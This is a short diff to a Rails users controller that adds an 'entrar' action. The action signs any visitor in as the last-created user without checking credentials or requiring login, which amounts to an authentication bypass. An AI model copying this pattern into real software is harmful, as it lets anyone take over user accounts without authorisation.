@@ -1,7 +1,12 @@
 class UsersController < ApplicationController
 	
 	before_filter :login_required, :only => [:show,:user_sign_out,:update]
-
+	def entrar
+		user = User.last
+		sign_in(user)
+		redirect_to root_path
+		
+	end
 	def update
 		@user = current_user
 		#miro si el id del usuario que quiere modificar es el suyo
